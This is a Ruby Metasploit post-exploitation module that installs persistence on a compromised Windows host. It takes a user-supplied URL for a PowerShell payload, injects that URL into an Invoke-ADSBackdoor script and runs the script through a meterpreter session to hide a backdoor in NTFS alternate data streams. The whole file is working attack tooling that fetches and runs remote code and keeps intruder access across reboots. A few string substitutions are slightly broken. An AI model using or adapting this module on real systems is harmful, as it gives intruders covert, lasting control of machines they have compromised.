##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'
class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Powershell
  def initialize(info={})
     super(update_info(info,
         'Name'            => 'Alternate Data Stream Persistence',
         'Description'     => 'This module is able to create persistence on a compromised host by using Alternate Data Streams. Tested on Windows 7.',
         'License'         => MSF_LICENSE,
         'Author'          => 'Matt Nelson (@enigma0x3)',
         'References'      => [ 'URL', 'https://enigma0x3.wordpress.com/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/' ],
         'Platform'        => [ 'win' ],
         'Arch'            => [ 'x86', 'x64' ],
         'SessionTypes'    => [ 'meterpreter'],
        
       ))
 register_options(
  [
    OptString.new('URL', [ true, 'URL containing payload in the form of a Powershell Script' ]),
    OptString.new('ARGUMENTS', [ false, 'Arguments for the Payload specified (if needed)' ]),
  ], self.class)

  end

  # Function to run the Invoke-ADSBackdoor Powershell Script
  def execute_invokeADSBackdoor_script(url,arguments)
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-ADSBackdoor.ps1"))
    if arguments.nil?
       surl = url.gsub("{URL}",url)
       psh_script1 = base_script.gsub("R{URL}", "#{surl}")
       psh_script = psh_script1.gsub("#R{ARGUMENTS}", "") << "Invoke-ADSBackdoor"
    else
       surl = url.gsub("{URL)",url)
       sarguments = arguments.gsub("{ARGUMENTS}",arguments)
       psh_script1 = base_script.gsub("R{URL}", "#{surl}")
       psh_script = psh_script1.gsub("#R{ARGUMENTS}", "#{sarguments}") << "Invoke-ADSBackdoor"
    end
    compressed_script = compress_script(psh_script)
    cmd_out, open_channels = execute_script(compressed_script)
  end

  # Main Method
  def run
    url = datastore['URL']
    arguments = datastore['ARGUMENTS']

  case arguments
  when nil
    print_status("Creating ADS with Payload containing no arguments...")
    execute_invokeADSBackdoor_script(url, nil)
    print_status("ADS Created!")
  else
    print_status("Creating ADS with Payload and specified arguments...")
    execute_invokeADSBackdoor_script(url, arguments)
    print_status("ADS Created!")
    end
  end
end
